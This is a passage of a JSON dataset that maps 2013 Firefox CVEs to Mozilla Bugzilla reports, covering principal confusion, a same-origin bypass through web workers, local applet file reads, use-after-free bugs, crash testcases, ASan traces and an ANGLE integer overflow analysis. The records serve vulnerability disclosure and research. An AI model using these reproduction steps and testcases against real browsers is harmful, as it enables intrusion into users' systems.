can then invoke. And it can invoke these function with arbitrary JS objects for |this| and the associated arguments, which the XBL generally does not expect. I can think of two solutions here: 1 - For XBL scopes, make non-waived JS object use an Opaque wrapper rather than a CrossCompartmentWrapper. This would mean that we'd have to deep-waive for field access, but maybe that's ok. 2 - If we decide it's not OK, we could implement a two-tiered system of waiving. One would be deep waiving, which we have right now, and the other would be \"just waive until I get back to a native object\", which is currently the no-waiver behavior. This would allow us to make the no-waiver behavior opaque. This is probably a fair amount more code than option (1). Blake, Boris - Can you guys weigh in? Do you think it's ok to deep-waive for field access?"
      }
    ],
    "CVE-2013-1713": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=887098",
        "title": "InstallTrigger can use the wrong principal when validating URI loads",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0 (Beta/Release) Build ID: 20130511120803 Steps to reproduce: I held a reference to the eval function of another window before loading the new pdf.js implementation in that window, and then used that reference to show that components/extensions implementing their own security checks can potentially allow unsafe actions to be performed from content. Actual results: Since the pdf.js implementation has access to resource:// and file:// URLs, it was possible to use InstallTrigger to issue a warning to the error console/firebug demonstrating that it actually uses the principal of the new pdf viewer when performing its own security checks which happen here: http://mxr.mozilla.org/mozilla-central/source/toolkit/mozapps/extensions/content/extensions-content.js#152 This is a potential concern in other javascript components that use the document of the window they're accessible from to perform checks against URLs before performing sensitive actions, and could also potentially be used to bypass the same origin policy and other all around nastiness. I had some success before firefox 21 installing webapps for other domains with this technique but didnt see it as a very big concern since access to navigator.mozApps.mgmt has since been properly handled which means that any DOMRequest object returned from such an install will be a cross compartment wrapper and deny access. In this instance I showed that InstallTrigger gains local filesystem access in the warning that results. Expected results: I should have received the normal exception that results from passing a file:/// URL to InstallTrigger.install from content. In this instance this is the fault of the InstallTrigger object so I'm sure there's other code that this should raise concerns about."
      }
    ],
    "CVE-2013-1714": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=879787",
        "title": "Cross Domain Policy override using webworkers",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 (Beta/Release) Build ID: 20130206152201 Steps to reproduce: I create a web worker in hostA, the webworker has instructions to send a XMLHttpRequest to hostB, also this request include custom headers. I have try the same XMLHttpRequest using regular javascript and it wont work, the security check are in place that way, the problem is related to the webworkers Actual results: The request went thought, attached firefox images and burp proxy Expected results: This is not compliant with the same domain policy, also the ability to include custom headers could be a mayor problem as is a vector to attack CSRF protection based on headers."
      }
    ],
    "CVE-2013-1717": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=406541",
        "title": "local java applet may read arbitrary files under certain circumstances",
        "description": "recent trunk has restrictions on what local html can access in bug 402998 Comment #8 someone with sun.com email asked to \"post a test\" for local applet circumventing restrictions. it is like beating a death horse, but here it is: if the path of the locally saved applet is known at applet compile time, the applet can read any file. note that if the luser saves files in a single directory, a two stage attack may be successful with high probability. suppose the applet is saved in directory: /tmp/DumbUglyB1llMarriedDumbUglyB1tch it should be instantiated like this: <applet codebase=\"file:///\" code=\"tmp.DumbUglyB1llMarriedDumbUglyB1tch.a1\"> </applet> and the applet should contain: /* * This is the path to the applet filename: * */ package tmp.DumbUglyB1llMarriedDumbUglyB1tch; public class a1 extends Applet {"
      }
    ],
    "CVE-2013-1718": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=897676",
        "title": "GC hazard in XPCWrappedNative::WrapNewGlobal with AutoMarkingNativeScriptableInfoPtr",
        "description": "In WrapNewGlobal, we created a a new XPCNativeScriptableInfo, and stash it in a AutoMarkingNativeScriptableInfoPtr to keep it (or rather its associated XPCNativeScriptableShared) alive. But in certain cases, we end up using the proto's |si|, and delete the one we created. However, we fail to null out the AutoMarkingPtr. So if we trigger a GC before the pointer goes out of scope (which is exactly what my patch in bug 897322 does), we'll end up marking garbage data, which is a use-after-free. This is probably a regression from bug 720580, which I landed about a year and a half ago. I'm going to hazard a guess that this is sec-high. It's a use-after-free, but mitigated in several ways. In particular, it's not clear that there's a way on trunk to trigger a GC at the right place (though I'm far from convinced that it's impossible), and it the Mark() operation is limited enough that exploiting its use-after-free behavior would be very tricky."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=901351",
        "title": "Assertion failure: !obj->is<ProxyObject>(), at js/src/json.cpp:676",
        "description": "The following test case asserts with: !obj->is<ProxyObject>(), at js/src/json.cpp:676 JSON.parse('{\"a\":0, \"b\":1}', function(n, v) { if (n == \"a\") { Object.defineProperty(this, \"b\", {value: new Proxy({c:0}, {})}) } return v })"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=889193",
        "title": "Assertion failure: !aGCThing after setting expando property on a DOMCursor",
        "description": "var req = mozContacts.getAll({}); req.blabla = function() {}; req is a DOMCursor. Assertion failure: !aGCThing, at /xpcom/base/CycleCollectedJSRuntime.cpp:831"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=899022",
        "title": "crash in nsCOMPtr_base::assign_with_AddRef | nsWindowRoot::PreHandleEvent",
        "description": "It's #10 browser crasher on Mac OS X in 22.0. Signature nsCOMPtr_base::assign_with_AddRef(nsISupports*) | nsWindowRoot::PreHandleEvent(nsEventChainPreVisitor&) More Reports Search UUID b7fb3d22-1570-4eb8-8c15-e7d7a2130729 Date Processed 2013-07-29 04:07:12.795335 Uptime 35480 Install Age 94426 since version was first installed. Install Time 2013-07-28 01:53:08 Product Firefox Version 23.0 Build ID 20130725195523 Release Channel beta OS Mac OS X OS Version 10.8.4 12E55 Build Architecture amd64 Build Architecture Info family 6 model 23 stepping 10 | 2 Crash Reason EXC_BAD_ACCESS / KERN_INVALID_ADDRESS Crash Address 0x8 App Notes AdapterVendorID: 0x10de, AdapterDeviceID: 0x 863GL Layers? GL Context? GL Context+ GL Layers+ Frame Module Signature Source 0 XUL nsCOMPtr_base::assign_with_AddRef(nsISupports*) obj-firefox/x86_64/xpcom/build/nsCOMPtr.cpp 1 XUL nsWindowRoot::PreHandleEvent(nsEventChainPreVisitor&) obj-firefox/x86_64/dist/include/nsCOMPtr.h 2 XUL nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) content/events/src/nsEventDispatcher.cpp 3 XUL nsEventDispatcher::DispatchDOMEvent(nsISupports*, nsEvent*, nsIDOMEvent*, nsPresContext*, nsEventStatus*) content/events/src/nsEventDispatcher.cpp 4 XUL nsINode::DispatchEvent(nsIDOMEvent*, bool*) content/base/src/nsINode.cpp 5 XUL nsContentUtils::DispatchEvent(nsIDocument*, nsISupports*, nsAString_internal const&, bool, bool, bool, bool*) content/base/src/nsContentUtils.cpp 6 XUL nsContentUtils::DispatchTrustedEvent(nsIDocument*, nsISupports*, nsAString_internal const&, bool, bool, bool*) content/base/src/nsContentUtils.cpp 7 XUL nsGlobalWindow::FireOfflineStatusEvent() dom/base/nsGlobalWindow.cpp 8 XUL nsGlobalWindow::Observe(nsISupports*, char const*, unsigned short const*) dom/base/nsGlobalWindow.cpp 9 XUL nsObserverList::NotifyObservers(nsISupports*, char const*, unsigned short const*) xpcom/ds/nsObserverList.cpp 10 XUL nsObserverService::NotifyObservers(nsISupports*, char const*, unsigned short const*) xpcom/ds/nsObserverService.cpp 11 XUL nsIOService::SetOffline(bool) netwerk/base/src/nsIOService.cpp 12 XUL nsIOService::Observe(nsISupports*, char const*, unsigned short const*) netwerk/base/src/nsIOService.cpp 13 XUL _ZThn8_N11nsIOService7ObserveEP11nsISupportsPKcPKt netwerk/base/src/nsIOService.cpp 14 XUL nsObserverList::NotifyObservers(nsISupports*, char const*, unsigned short const*) xpcom/ds/nsObserverList.cpp 15 XUL nsObserverService::NotifyObservers(nsISupports*, char const*, unsigned short const*) xpcom/ds/nsObserverService.cpp 16 XUL nsXREDirProvider::DoShutdown() toolkit/xre/nsXREDirProvider.cpp 17 XUL ScopedXPCOMStartup::~ScopedXPCOMStartup() toolkit/xre/nsAppRunner.cpp 18 XUL XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp 19 XUL XRE_main toolkit/xre/nsAppRunner.cpp 20 firefox main browser/app/nsBrowserApp.cpp 21 firefox start More reports at: https://crash-stats.mozilla.com/report/list?product=Firefox&signature=nsCOMPtr_base%3A%3Aassign_with_AddRef%28nsISupports*%29+|+nsWindowRoot%3A%3APreHandleEvent%28nsEventChainPreVisitor%26%29 https://crash-stats.mozilla.com/report/list?product=Firefox&signature=%400x0+|+nsCOMPtr_base%3A%3Aassign_with_AddRef%28nsISupports*%29+|+nsWindowRoot%3A%3APreHandleEvent%28nsEventChainPreVisitor%26%29"
      }
    ],
    "CVE-2013-1719": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=893519",
        "title": "Compartment mismatch with asm module in event listener attribute",
        "description": "bp-3956aca3-ec88-4820-8830-a6f392130714"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=847606",
        "title": "Crash with ion, setTimeout(Array.prototype.filter)",
        "description": "Testcase can cause: * Assertion failure: hasfp(), at js/src/vm/Stack.h:1663 * Crash [@ js::ion::FastInvoke] Security-sensitive because the testcase reminds me of bug 815010."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=898832",
        "title": "crash in mozilla::dom::NodeBinding::get_childNodes",
        "description": "It's #48 browser crasher in 23.0b8 and #15 in the first day of 23.0b9. Using mozregression, the regression range is: http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=b980d32c366f&tochange=ea059733677c and the working range is: http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=d2a7cfa34154&tochange=8ea92aeab783 It might be fixed by bug 884401's patch. Signature mozilla::dom::NodeBinding::get_childNodes More Reports Search UUID e4aa87e5-24e7-4e0e-8da1-db5842130728 Date Processed 2013-07-28 08:05:27.125889 Uptime 22 Last Crash 27 seconds before submission Install Age 51551 since version was first installed. Install Time 2013-07-27 17:46:07 Product Firefox Version 23.0 Build ID 20130725195523 Release Channel beta OS Windows NT OS Version 6.1.7601 Service Pack 1 Build Architecture x86 Build Architecture Info GenuineIntel family 6 model 23 stepping 10 | 2 Crash Reason EXCEPTION_ACCESS_VIOLATION_EXEC Crash Address 0x12143c20 App Notes AdapterVendorID: 0x8086, AdapterDeviceID: 0x2a42, AdapterSubsysID: 02051025, AdapterDriverVersion: 8.15.10.2202 D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ Frame Module Signature Source 0 @0x12143c20 1 xul.dll mozilla::dom::NodeBinding::get_childNodes obj-firefox/dom/bindings/NodeBinding.cpp 2 mozjs.dll ToLowerCaseHelper js/src/jsstr.cpp 3 @0x1 4 @0x1f8c03bc More reports at: https://crash-stats.mozilla.com/report/list?product=Firefox&signature=mozilla%3A%3Adom%3A%3ANodeBinding%3A%3Aget_childNodes"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=854897",
        "title": "Medium exploitable crash [@ IndicShape] with EXCEPTION_STACK_BUFFER_OVERRUN [WinXP]",
        "description": "1. http://www.quraneralo.com/our-duties-towards-sahabah/ on Windows XP Firefox 18, Beta/20, Aurora/21, Nightly/22. Crash opt: [@ IndicShape(HDC__*, void**, unsigned short const*, int, int, tag_SCRIPT_ANALYSIS*, unsigned short*, unsigned short*, tag_SCRIPT_VISATTR*, int*) ] 0 usp10.dll IndicShape 1 xul.dll gfxUniscribeShaper::ShapeText gfx/thebes/gfxUniscribeShaper.cpp:490 2 xul.dll gfxShapedText::SetupClusterBoundaries gfx/thebes/gfxFont.cpp:4557 3 mozalloc.dll moz_xrealloc memory/mozalloc/mozalloc.cpp:86 4 xul.dll gfxFontGroup::InitScriptRun<wchar_t> gfx/thebes/gfxFont.cpp:3951 5 xul.dll gfxScriptItemizer::Next gfx/thebes/gfxScriptItemizer.cpp:228 exploitability: medium EXCEPTION_STACK_BUFFER_OVERRUN bp-2008e109-b8ca-43d3-9acd-32b332130326 bp-905e95fe-e369-4cdf-89f7-4bc302130326 Crash debug: usp10.dll@0x31a31 gfxUniscribeShaper::ShapeText nsAutoTArray<gfxShapedText::DetailedGlyph, int>::~nsAutoTArray<gfxShapedText::DetailedGlyph, int> gfxHarfBuzzShaper::SetGlyphsFromRun exploitability: medium EXCEPTION_STACK_BUFFER_OVERRUN"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=898381",
        "title": "IonMonkey: Fix ARM moveValue so that GC pointers are traced",
        "description": "I was reading some unrelated code earlier today and noticed this. I'm not sure it can cause crashes right now, but there are some callers that pass a Value that could be an object/string I think, so let's assume it's possible. x86/x64 already do this and grep shows this is the only place that uses payload.i32 without an isMarkable() check."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=895294",
        "title": "Crash [@ mozilla::dom::MaybeWrapObjectValue] with document.all after navigating away and GCing",
        "description": "1. Set: user_pref(\"javascript.options.baselinejit.unsafe_eager_compilation\", true); 2. Install https://www.squarefree.com/extensions/domFuzzLite3.xpi 3. Load the testcase Result: Crash [@ mozilla::dom::MaybeWrapObjectValue] Might be debug-only."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=851982",
        "title": "Assertion failure in nsUnicharStreamLoader::WriteSegmentFun with ISO-2022-JP (#2)",
        "description": "Assertion failure: ((bool)(__builtin_expect(!!(!NS_FAILED_impl(rv)), 1))), at netwerk/base/src/nsUnicharStreamLoader.cpp:218 Same assertion as bug 843434, which Josh fixed last week."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=909494",
        "title": "Crash with SIGTRAP with ParallelArray and --ion-check-range-analysis",
        "description": "The following testcase crashes on mozilla-central revision 4887845b1142 (threadsafe build, run with --fuzzing-safe --ion-check-range-analysis): assertArraySeqParResultsEq(range(0, 1024), \"filter\", function(e, i) { return (i % (1.1)) != 0; }); function range(n, m) { var result = []; for (var i = n; i < m; i++) result.push(i); return result; } function assertArraySeqParResultsEq(arr, op, func) { arr[op].apply(arr, [func]); }"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=876878",
        "title": "crash in webrtc::videocapturemodule::GetMaxOfFrameArray",
        "description": "This bug was filed from the Socorro interface and is report bp-0a4f8b73-e624-48f2-bbf5-dc62d2130527 . ============================================================= Frame Module Signature Source 0 xul.dll webrtc::videocapturemodule::GetMaxOfFrameArray media/webrtc/trunk/webrtc/modules/video_capture/windows/help_functions_ds.cc:26 1 xul.dll webrtc::videocapturemodule::DeviceInfoDS::CreateCapabilityMap media/webrtc/trunk/webrtc/modules/video_capture/windows/device_info_ds.cc:609 2 xul.dll webrtc::videocapturemodule::DeviceInfoImpl::NumberOfCapabilities media/webrtc/trunk/webrtc/modules/video_capture/device_info_impl.cc:76 3 xul.dll webrtc::ViECaptureImpl::NumberOfCapabilities media/webrtc/trunk/webrtc/video_engine/vie_capture_impl.cc:442 4 xul.dll mozilla::MediaEngineWebRTCVideoSource::ChooseCapability content/media/webrtc/MediaEngineWebRTCVideo.cpp:157 5 xul.dll mozilla::MediaEngineWebRTCVideoSource::Allocate content/media/webrtc/MediaEngineWebRTCVideo.cpp:224 6 xul.dll mozilla::GetUserMediaRunnable::ProcessGetUserMedia dom/media/MediaManager.cpp:739 7 xul.dll mozilla::GetUserMediaRunnable::Run dom/media/MediaManager.cpp:600 8 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:627 9 xul.dll nsThread::ThreadFunc xpcom/threads/nsThread.cpp:265 10 nss3.dll _PR_NativeRunThread nsprpub/pr/src/threads/combined/pruthr.c:395 11 nss3.dll pr_root nsprpub/pr/src/md/windows/w95thred.c:90 12 msvcr100.dll _callthreadstartex f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\threadex.c:314 13 msvcr100.dll _threadstartex f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\threadex.c:292 14 kernel32.dll BaseThreadInitThunk 15 ntdll.dll __RtlUserThreadStart 16 ntdll.dll _RtlUserThreadStart"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=863935",
        "title": "Use-after-poison in nsFrameList::UnhookFrameFromSiblings with moz-column",
        "description": "Debug: Assertion failure: !GetPropTableFrames(aPresContext, aProperty), at layout/generic/nsContainerFrame.cpp:1459 ASan: Use-after-poison of pres arena memory in nsFrameList::UnhookFrameFromSiblings. Nightly: No symptoms."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=883450",
        "title": "Conservative Stack Scanner doesn't work when not in a request",
        "description": "I've been debugging bug 879649 for a good day and a half now, and finally figured out what's going on. In bug MarkConservativeStackRoots, we bail out of stack scanning if !cgcd->hasStackToScan(): http://mxr.mozilla.org/mozilla-central/source/js/src/gc/RootMarking.cpp#316 This predicate just evaluates to !!nativeStackTop - that is to say, whether we have a usable pointer to the top of the stack. This pointer is generated in RecordNativeStackTopForGC, but is then _cleared_ in updateForRequestEnd(), which gets called when our request count drops to zero: http://mxr.mozilla.org/mozilla-central/source/js/src/jsapi.cpp#1230 And though RecordNativeStackTopForGC is called at the beginning of Collect(), it no-ops because the request depth is zero: http://mxr.mozilla.org/mozilla-central/source/js/src/jsgc.cpp#963 This means that _anything_ on the stack outside of a request isn't rooted at all. I wouldn't be surprised if there were dozens of such cases in the browser - especially from consumers of nsIScriptContext functions, who don't necessarily have a need to enter a request themselves. Marking sec-critical, because the surface is wide enough that there's almost certainly an exploitable case somewhere."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=750932",
        "title": "ASAN: Test test_multipart_streamconv_missing_lead_boundary.js triggers error",
        "description": "This xpcshell test \"test_multipart_streamconv_missing_lead_boundary.js\" fails with AddressSanitizer on mozilla-central revision 6e34995a746e. The output of the command make SOLO_FILE=\"test_multipart_streamconv_missing_lead_boundary.js\" -C netwerk/test/ check-one 2>&1 | asan_symbolize.py | c++filt is attached, which includes the backtrace of the problem. Not sure which component this belongs to exactly, please move as appropriate :) Marking this s-s until triaged and confirmed to be safe."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=873073",
        "title": "nsNativeThemeWin seems to spin event loop during layout",
        "description": "This is what causes Bug 748156. 07:01:45 INFO - ###!!! ASSERTION: This is unsafe! Fix the caller!: 'Error', file e:/builds/moz2_slave/m-cen-w32-d-000000000000000000/build/content/events/src/nsEventDispatcher.cpp, line 494 07:01:45 INFO - nsEventDispatcher::DispatchDOMEvent(nsISupports *,nsEvent *,nsIDOMEvent *,nsPresContext *,nsEventStatus *) [content/events/src/nsEventDispatcher.cpp:692] 07:01:45 INFO - nsGlobalWindow::DispatchEvent(nsIDOMEvent *,bool *) [dom/base/nsGlobalWindow.cpp:7928] 07:01:45 INFO - nsGlobalWindow::DispatchEvent(nsIDOMEvent *,bool *) [dom/base/nsGlobalWindow.cpp:7909] 07:01:45 INFO - nsContentUtils::DispatchEvent(nsIDocument *,nsISupports *,nsAString_internal const &,bool,bool,bool,bool *) [content/base/src/nsContentUtils.cpp:3532] 07:01:45 INFO - nsContentUtils::DispatchTrustedEvent(nsIDocument *,nsISupports *,nsAString_internal const &,bool,bool,bool *) [content/base/src/nsContentUtils.cpp:3503] 07:01:45 INFO - nsFocusManager::WindowLowered(nsIDOMWindow *) [dom/base/nsFocusManager.cpp:766] 07:01:45 INFO - nsWebShellWindow::WindowDeactivated() [xpfe/appshell/src/nsWebShellWindow.cpp:418] 07:01:45 INFO - nsWindow::DispatchFocusToTopLevelWindow(bool) [widget/windows/nsWindow.cpp:4080] 07:01:45 INFO - nsWindow::ProcessMessage(unsigned int,unsigned int &,long &,long *) [widget/windows/nsWindow.cpp:5177] 07:01:45 INFO - nsWindow::WindowProcInternal(HWND__ *,unsigned int,unsigned int,long) [widget/windows/nsWindow.cpp:4390] 07:01:45 INFO - CallWindowProcCrashProtected [xpcom/base/nsCrashOnException.cpp:32] 07:01:45 INFO - nsWindow::WindowProc(HWND__ *,unsigned int,unsigned int,long) [widget/windows/nsWindow.cpp:4342] 07:01:45 INFO - USER32 + 0x186ef 07:01:45 INFO - USER32 + 0x18876 07:01:45 INFO - USER32 + 0x170f4 07:01:45 INFO - USER32 + 0x1738f 07:01:45 INFO - ntdll + 0x4642e 07:01:45 INFO - USER32 + 0x17308 07:01:45 INFO - USER32 + 0x1729f 07:01:45 INFO - USER32 + 0xbf96 07:01:45 INFO - USER32 + 0x1738f 07:01:45 INFO - ntdll + 0x4642e 07:01:45 INFO - QueryForButtonData [widget/windows/nsNativeThemeWin.cpp:119] 07:01:45 INFO - nsIFrame::AddCSSMinSize(nsBoxLayoutState &,nsIFrame *,nsSize &,bool &,bool &) [layout/xul/base/src/nsBox.cpp:690] 07:01:45 INFO - nsBoxFrame::GetMinSize(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:816] 07:01:45 INFO - nsBoxFrame::GetPrefSize(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:768] 07:01:45 INFO - nsSprocketLayout::GetPrefSize(nsIFrame *,nsBoxLayoutState &) [layout/xul/base/src/nsSprocketLayout.cpp:1320] 07:01:45 INFO - nsBoxFrame::GetPrefSize(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:757] 07:01:45 INFO - nsSprocketLayout::GetPrefSize(nsIFrame *,nsBoxLayoutState &) [layout/xul/base/src/nsSprocketLayout.cpp:1320] 07:01:45 INFO - nsBoxFrame::GetPrefSize(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:757] 07:01:45 INFO - nsSprocketLayout::GetPrefSize(nsIFrame *,nsBoxLayoutState &) [layout/xul/base/src/nsSprocketLayout.cpp:1320] 07:01:45 INFO - nsBoxFrame::GetPrefSize(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:757] 07:01:45 INFO - nsSprocketLayout::PopulateBoxSizes(nsIFrame *,nsBoxLayoutState &,nsBoxSize * &,int &,int &,int &) [layout/xul/base/src/nsSprocketLayout.cpp:738] 07:01:45 INFO - nsSprocketLayout::Layout(nsIFrame *,nsBoxLayoutState &) [layout/xul/base/src/nsSprocketLayout.cpp:221] 07:01:45 INFO - nsBoxFrame::DoLayout(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:899] 07:01:45 INFO - nsIFrame::Layout(nsBoxLayoutState &) [layout/xul/base/src/nsBox.cpp:512] 07:01:45 INFO - nsStackLayout::Layout(nsIFrame *,nsBoxLayoutState &) [layout/xul/base/src/nsStackLayout.cpp:343] 07:01:45 INFO - nsBoxFrame::DoLayout(nsBoxLayoutState &) [layout/xul/base/src/nsBoxFrame.cpp:899] 07:01:45 INFO - nsIFrame::Layout(nsBoxLayoutState &) [layout/xul/base/src/nsBox.cpp:512] 07:01:45 INFO - nsBoxFrame::Reflow(nsPresContext *,nsHTMLReflowMetrics &,nsHTMLReflowState const &,unsigned int &) [layout/xul/base/src/nsBoxFrame.cpp:703] 07:01:45 INFO - nsContainerFrame::ReflowChild(nsIFrame *,nsPresContext *,nsHTMLReflowMetrics &,nsHTMLReflowState const &,int,int,unsigned int,unsigned int &,nsOverflowContinuationTracker *) [layout/generic/nsContainerFrame.cpp:971] 07:01:45 INFO - ViewportFrame::Reflow(nsPresContext *,nsHTMLReflowMetrics &,nsHTMLReflowState const &,unsigned int &) [layout/generic/nsViewportFrame.cpp:226] 07:01:45 INFO - PresShell::ProcessReflowCommands(bool) [layout/base/nsPresShell.cpp:7929] 07:01:45 INFO - PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) [layout/base/nsPresShell.cpp:3891] 07:01:45 INFO - nsRefreshDriver::Tick(__int64,mozilla::TimeStamp) [layout/base/nsRefreshDriver.cpp:962] 07:01:45 INFO - mozilla::RefreshDriverTimer::TickDriver(nsRefreshDriver *,__int64,mozilla::TimeStamp) [layout/base/nsRefreshDriver.cpp:168] 07:01:45 INFO - mozilla::RefreshDriverTimer::Tick() [layout/base/nsRefreshDriver.cpp:159] 07:01:45 INFO - nsTimerImpl::Fire() [xpcom/threads/nsTimerImpl.cpp:547] 07:01:45 INFO - nsTimerEvent::Run() [xpcom/threads/nsTimerImpl.cpp:636] 07:01:45 INFO - nsThread::ProcessNextEvent(bool,bool *) [xpcom/threads/nsThread.cpp:627]"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=896126",
        "title": "Assertion failure: parent, at jswrapper.cpp",
        "description": "({ r: function() { function f() { w[0xe56241c6 >> 3] } }, s: function() { \"use asm\" return (1 for asserts js debug shell on m-c changeset 0d0263a58f06 without any CLI arguments at Assertion failure: parent, at jswrapper.cpp"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=871462",
        "title": "Clean up String API usages for dom/system/gonk",
        "description": "No description provided."
      }
    ],
    "CVE-2013-1720": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=888820",
        "title": "Heap-buffer-overflow READ in nsHtml5TreeBuilder::resetTheInsertionMode()",
        "description": "Tested on: OS: Ubuntu 12.04 Firefox: ASAN debug-build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-dbg-asan/1372636004/ ASAN-report: ==8023== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7fdd5ba3d03c at pc 0x7fdd88de045b bp 0x7fdd67267480 sp 0x7fdd67267478 READ of size 4 at 0x7fdd5ba3d03c thread T16 #0 0x7fdd88de045a in nsHtml5TreeBuilder::resetTheInsertionMode() /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5TreeBuilder.cpp:3247 #1 0x7fdd88de39e6 in nsHtml5TreeBuilder::eof() /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5TreeBuilder.cpp:529 #2 0x7fdd88dc4cf2 in nsHtml5StreamParser::ParseAvailableData() /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5StreamParser.cpp:1293 #3 0x7fdd88dc8a24 in nsHtml5StreamParserContinuation::Run() /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5StreamParser.cpp:1355 #4 0x7fdd8a83e1fb in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/xpcom/threads/nsThread.cpp:626 #5 0x7fdd8a782cd1 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238 #6 0x7fdd8a83bfec in nsThread::ThreadFunc(void*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/xpcom/threads/nsThread.cpp:264 #7 0x7fdd944c8926 in _pt_root /builds/slave/m-cen-l64-dbg-asan-00000000000/build/nsprpub/pr/src/pthreads/ptthread.c:204 #8 0x43f54a in __asan::AsanThread::ThreadStart() ??:0 0x7fdd5ba3d03c is located 4 bytes to the left of 256-byte region [0x7fdd5ba3d040,0x7fdd5ba3d140) allocated by thread T0 here: #0 0x43c620 in __interceptor_malloc ??:0 #1 0x7fdd92a2c547 in moz_xmalloc /builds/slave/m-cen-l64-dbg-asan-00000000000/build/memory/mozalloc/mozalloc.cpp:54 #2 0x7fdd88ddf7fb in operator new[](unsigned long) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/../../dist/include/mozilla/mozalloc.h:213 #3 0x7fdd88dded1e in nsHtml5TreeBuilder::startTokenization(nsHtml5Tokenizer*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5TreeBuilder.cpp:77 #4 0x7fdd88dc32ca in nsHtml5StreamParser::OnStartRequest(nsIRequest*, nsISupports*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/parser/html/nsHtml5StreamParser.cpp:880 #5 0x7fdd89487c1c in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/uriloader/base/nsURILoader.cpp:262 #6 0x7fdd873eaca0 in nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) /builds/slave/m-cen-l64-dbg-asan-00000000000/build/netwerk/base/src/nsBaseChannel.cpp:720 . . ."
      }
    ],
    "CVE-2013-1721": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=890277",
        "title": "ANGLE libGLESv2 Integer Overflow",
        "description": "Description: Almost Native Graphics Layer Engine (ANGLE) library Integer Overflow Versions Affected: Mozilla Firefox 22.0, Mozilla Nightly 25.0a1 (2013-07-03) Category: Memory Corruption Reporter: Alex Chapman of Context Information Security Summary: -------- The Almost Native Graphics Layer Engine (ANGLE) library as used in Mozilla Firefox is vulnerable to an integer overflow vulnerability leading to memory corruption which may allow an attacker to exploit the browser process. The ANGLE library is used by Firefox on Windows as a bridge between the OpenGL ES 2.0 API and DirectX. Note: As this is a bug in the ANGLE library a bug report has also been submitted to Google. Analysis: --------- The issue occurs due to insufficient bounds checking prior to integer multiplication within the Context::drawLineLoop function (libGLESv2/Context.cpp): const int spaceNeeded = (count + 1) * sizeof(unsigned int); if (!mLineLoopIB) { mLineLoopIB = new StreamingIndexBuffer(mDevice, INITIAL_INDEX_BUFFER_SIZE, D3DFMT_INDEX32); } if (mLineLoopIB) { mLineLoopIB->reserveSpace(spaceNeeded, GL_UNSIGNED_INT); UINT offset = 0; unsigned int *data = static_cast<unsigned int*>(mLineLoopIB->map(spaceNeeded, &offset)); startIndex = offset / 4; if (data) { switch (type) { case GL_NONE: // Non-indexed draw for (int i = 0; i < count; i++) { data[i] = i; } data[count] = 0; 